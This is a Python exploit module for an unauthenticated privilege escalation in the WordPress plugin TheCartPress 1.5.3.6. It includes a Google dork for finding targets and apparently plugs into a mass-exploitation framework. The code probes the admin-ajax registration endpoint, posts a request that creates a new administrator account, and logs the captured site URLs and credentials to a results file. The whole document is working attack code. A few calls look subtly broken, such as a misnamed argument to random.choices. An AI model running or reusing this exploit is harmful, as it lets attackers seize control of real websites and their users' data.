# Exploit Title: Wordpress Plugin TheCartPress 1.5.3.6 - Privilege Escalation (Unauthenticated)
# Google Dork: inurl:/wp-content/plugins/thecartpress/
# Date: 04/10/2021
# Exploit Author: spacehen
# Vendor Homepage: https://wordpress.org/plugin/thecartpress
# Version: <= 1.5.3.6
# Tested on: Ubuntu 20.04.1

import os.path
from os import path
import json
import requests;
import sys
import importlib
import string 
import random 

NO_USED = None

Plug_Helper = importlib.import_module('Core.Core_Helper')
Main_Task = importlib.import_module('main')

def Ran_Pass(leng=8):
    allowed_chars = string.ascii_letters + string.digits + "@#$&"
    return ''.join(random.choices(allowed_chars, kz=leng))

def Ran_User(leng=4):
    allowed_chars = string.digits + string.ascii_letters
    return ''.join(random.choices(allowed_chars, kz=leng))

class Exploit_CartPress():
	def __init__(self, Target, Proxies=NO_USED, Sess=NO_USED, WP_Nonce=NO_USED, UserAgent=NO_USED):
		self.Target = Target
		self.Proxies = Proxies
		self.Sess = Sess
		self.Code_Nonce = WP_Nonce
		self.SET_Timeout = 30 if Proxies else 10
		self.AU = UserAgent
		

	def Valid_Vuln(self):
		User_Runner = Plug_Helper.Threaded_GET(
											self.Target, 
											'wp-admin/admin-ajax.php?action=tcp_register_and_login_ajax', 
											self.SET_Timeout, 
											self.AU, 
											NO_USED, 
											NO_USED,
											NO_USED,
											'req_get',
											self.Proxies,
											NO_USED)
		User_Req = User_Runner.run()
		RES_CHECK = [User_Req[i] for i in User_Req][0]
		if 'User name is required' in RES_CHECK['resp'].text:
			return True
		
		return False
		
	def Exploiter(self):
		try:
			if self.Valid_Vuln():
				WP_User = Ran_User(6)
				WP_Pass = Ran_Pass(12)
				payloaDATA = {
				"tcp_new_user_name" : f"admin_{WP_User}",
				"tcp_new_user_pass" : f"{WP_Pass}admin",
				"tcp_repeat_user_pass" : f"{WP_Pass}admin",
				"tcp_new_user_email" : f"{WP_User}{WP_Pass}@mailserver.com",
				"tcp_role" : "administrator" 
				}
				INJ_ADD = Plug_Helper.Thread_POST(
													CFG_DOMAIN=self.Target, 
													CFG_VULN='wp-admin/admin-ajax.php?action=tcp_register_and_login_ajax',
													CFG_TIMEOUT=self.SET_Timeout,
													CFG_USERAGENT=self.AU, 
													CFG_DATA=payloaDATA,
													CFG_FILE_UPLOAD=NO_USED, 
													CFG_RAW_BODY=NO_USED, 
													CFG_DELAY_ATTACK=0, 
													CFG_MODE=NO_USED, 
													SET_REDIRECT=NO_USED,
													CFG_Proxies=self.Proxies,
													Mem_Sess=NO_USED
															
												)
					
				RESPONSED = INJ_ADD.run()

				SUCCESSORNOT = [RESPONSED[i] for i in RESPONSED][0]
				if "\"\"" == SUCCESSORNOT['resp'].text or "\"\"" in SUCCESSORNOT['resp'].text:
					Plug_Helper.Printed_Value.Log_Success(self.Target, f"[PLUGIN] CartPress | ADD_Admin") 
					Logged_RZ = f'WP_URL : {self.Target}\nWP_User : admin_{WP_User}\nWP_PWD : {WP_Pass}admin\n***********************************'
					Main_Task.Saved_Result(r"DB_Results/Add_WPAdmin_Logged.txt", f"{Logged_RZ}\n")
				else:
					Plug_Helper.Printed_Value.Log_Fail(self.Target, f"[PLUGIN] CartPress | Failed") 	
			
			else:
				Plug_Helper.Printed_Value.Log_Fail(self.Target, f"[PLUGIN] CartPress | Failed") 	
		except:pass 
			#Plug_Helper.Printed_Value.Log_Error('Error Exploiter CartPress', f"{err}") 	 

def Plugin_BurnWP(Target, Proxies, Sess, WPNonce, UserAgent, PLUGIN_CONTROL_SYSTEM, FOUND_CMS):
	try:
		
		if PLUGIN_CONTROL_SYSTEM['C_WordPress'] and FOUND_CMS == 'WORDPRESS': 
			EX_Run = Exploit_CartPress(Target, Proxies, Sess, WPNonce, UserAgent)
			EX_Run.Exploiter()
		return 
	#except Exception as e:
	except:pass 
		#Plug_Helper.Printed_Value.Log_Error('Error CartPress', f"{e}") 	  